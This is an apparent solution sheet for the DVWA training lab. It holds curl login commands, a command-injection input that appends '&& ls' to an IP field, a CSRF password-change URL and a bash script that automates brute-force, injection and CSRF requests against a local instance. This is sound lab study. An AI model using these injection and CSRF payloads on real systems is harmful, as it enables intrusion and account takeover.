# dvwa solution

---

## content

- [login](#login)
- [command injection](#command-injection)
  - [command injection - low](#command-injection---low)
- [csrf](#csrf)
  - [csrf - low](#csrf---low)
- [sql](sql)
- [script](#script)

---

## login

```bash
linux:~ $ DVWA_IP=127.0.0.1
linux:~ $ DVWA_USERNAME=admin
linux:~ $ DVWA_PPASSWORD=password
linux:~ $ COOKIE=$(mktemp --suffix=.cookie)
linux:~ $ USER_TOKEN=$(curl -c ${COOKIE} -s http://${DVWA_IP}/login.php | grep user_token | sed s/.*value=\'// | sed s/\'.*//)

linux:~ $ curl -k -s -l \
  -c ${COOKIE} \
  -X POST -d "username=${DVWA_USERNAME}&password=${DVWA_PPASSWORD}&Login=Login&user_token=${USER_TOKEN}" \
  http://${DVWA_IP}/login.php
```

---

## command injection

### command injection - low

```text
127.0.0.1 && ls
```

---

## csrf

### csrf - low

```bash
http://${DVWA_IP}//vulnerabilities/csrf/?password_new=abcd&password_conf=abcd&Change=Change#
```

---

## sql

---

## script

```bash
#!/bin/bash

###
### global variables
###

DVWA_IP=${DVWA_IP:=127.0.0.1}
DVWA_USERNAME=${DVWA_USERNAME:=admin}
DVWA_PPASSWORD=${DVWA_PPASSWORD:=password}
CURL_TIMEOUT=60


###
### function
###

init_env() {
  COOKIE=${COOKIE:=$(mktemp --suffix=.cookie)}

  if [[ -z "${USER_TOKEN}" ]]; then
    USER_TOKEN=$(curl -c $COOKIE -s http://${DVWA_IP}/login.php | grep user_token | sed s/.*value=\'// | sed s/\'.*//)
  fi
}

login() {
  local curl_opts=(
    --insecure
    --silent
    --verbose
    --location
    --max-time "${CURL_TIMEOUT}"
    --cookie "${COOKIE}"
    --request POST
    --write-out "\nResponse code: %{http_code}\nResponse time: %{time_total}\n"
  )
  curl_opts+=(
    --data "username=${DVWA_USERNAME}&password=${DVWA_PPASSWORD}&Login=Login&user_token=${USER_TOKEN}"
  )

  curl "${curl_opts[@]}" http://${DVWA_IP}/login.php
}

about() {
  echo "ip: $DVWA_IP"
  echo "username: $DVWA_USERNAME"
  echo "password: $DVWA_PPASSWORD"
  echo "cookie: $COOKIE"
  echo "user_token: $USER_TOKEN"
}

dvwa_curl() {
  local method=$1
  local url=$2
  local data=$3

  # curl:
  # -k = --insecure
  # -s = --silent
  # -v = --verbose
  # -L = --location
  # -m = --max-time
  # -c = --cookie-jar
  # -b = --cookie
  # -w = --write-out
  # -d = --data
  # -H = --header
  # -X = --request

  local curl_opts=(
    --insecure
    --silent
    --verbose
    --location
    --max-time "${CURL_TIMEOUT}"
    --cookie "${COOKIE}"
    --request "${method}"
    --write-out '\nResponse code: %{http_code}\nResponse time: %{time_total}\n'
    --header 'content-type: application/x-www-form-urlencoded'
    --compressed
  )

  if [[ ! -z "${data}" ]]; then
    curl_opts+=(
      --data "${data}"
    )
  fi

  curl "${curl_opts[@]}" "$url"
}

home() {
  dvwa_curl GET "http://${DVWA_IP}"
}

brute_force() {
  local username=$1
  local password=$2

  dvwa_curl GET "http://${DVWA_IP}/vulnerabilities/brute/?username=${username}&password=${password}&Login=Login"
}

command_injection() {
  local data=$1

  dvwa_curl POST "http://${DVWA_IP}/vulnerabilities/exec/" "${data}"
}

csrf() {
  local new_password=$1

  dvwa_curl GET "http://${DVWA_IP}/vulnerabilities/csrf/?password_new=${new_password}&password_conf=${new_password}&Change=Change"
}

###
### main
###

init_env
login >& /dev/null

# home
# brute_force $DVWA_USERNAME password

# normal
# command_injection "ip=127.0.0.1&Submit=Submit"
# low
# command_injection "ip=127.0.0.1+%26%26+ls&Submit=Submit"

# csrf "password1234"
```
